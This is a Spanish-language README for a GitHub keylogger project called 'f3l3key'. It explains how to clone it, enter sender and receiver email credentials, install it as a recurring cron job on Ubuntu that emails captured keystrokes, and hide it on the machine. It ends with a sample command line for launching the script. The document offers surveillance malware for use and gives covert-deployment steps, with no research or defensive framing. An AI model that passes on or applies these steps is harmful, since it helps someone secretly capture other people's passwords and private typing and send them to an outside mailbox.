# f3l3key
##############################################################################################<br><br>
En este repositorio podrás descargar un KEYLOGGER y ponerlo en funcionamiento. Con este podrás generar un archivo con todas las pulsaciones del teclado y enviarlo por correo electrónico.<br><br>
[![keylogger.jpg](https://i.postimg.cc/rwDvqpcB/keylogger.jpg)](https://postimg.cc/LJMyT2JD)
<br><br>
PASOS A SEGUIR<br><br>
1- Sitúate en una terminal de Ubuntu y aplica la siguiente comanda: git clone https://github.com/f3l3p1n0/f3l3key.git<br>
2- Abre el archivo tester.sh y cambia: la ruta, correo emisor, la clave del emisor y el correo receptor. Para seguir con mayor detalle estos pasos
diríjete a este artículo: https://f3l3p1n0.github.io/posts/f3l3key/post.html<br>
3- Una vez editado el archivo, guárdalo y dale permisos de ejecución a los 3 archivos.<br>
4- Ejecuta el archivo installer.sh<br>
5- Cuando se detenga en el apartado de crontab, presiona 1 y la tecla enter.<br>
6- Guarda el archivo y habrás creada la nueva tarea Cron.<br>
7- Listo, ahora debes esperar los minutos correspondientes para recibir en tu cuenta receptora los correos.<br><br>

pd: Es recomendable que el keylogger se ubique en una posición oculta. Ten en cuenta que debes especificar la ruta donde se encuentra el keylogger, de lo contrario no funcionará. De igual manera, debes respetar la siguiente linea con los mismos espacios y estructura:

python3 /home/user/Descargas/f3l3key.py emisor@gmail.com pega_la_clave_aqui receptor@hotmail.com &

